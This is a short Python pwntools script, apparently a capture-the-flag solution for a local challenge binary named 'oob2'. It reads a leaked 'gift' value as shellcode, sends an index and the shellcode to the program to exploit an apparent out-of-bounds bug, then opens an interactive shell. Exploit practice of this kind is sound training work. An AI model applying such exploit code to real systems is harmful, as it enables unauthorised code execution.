from pwn import *

c = process("./oob2")

context.log_level = 'debug'

c.recvuntil("gift") # drop string
shellcode = c.recvline()[1:-1]

print(shellcode)

c.sendlineafter(":", str(5))
c.sendlineafter(":", shellcode)

c.interactive()
c.close()
